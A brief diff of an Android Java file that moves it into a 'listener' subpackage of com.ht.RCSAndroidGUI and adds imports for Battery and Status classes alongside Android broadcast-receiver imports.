@@ -1,4 +1,7 @@
-package com.ht.RCSAndroidGUI;
+package com.ht.RCSAndroidGUI.listener;
+
+import com.ht.RCSAndroidGUI.Battery;
+import com.ht.RCSAndroidGUI.Status;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
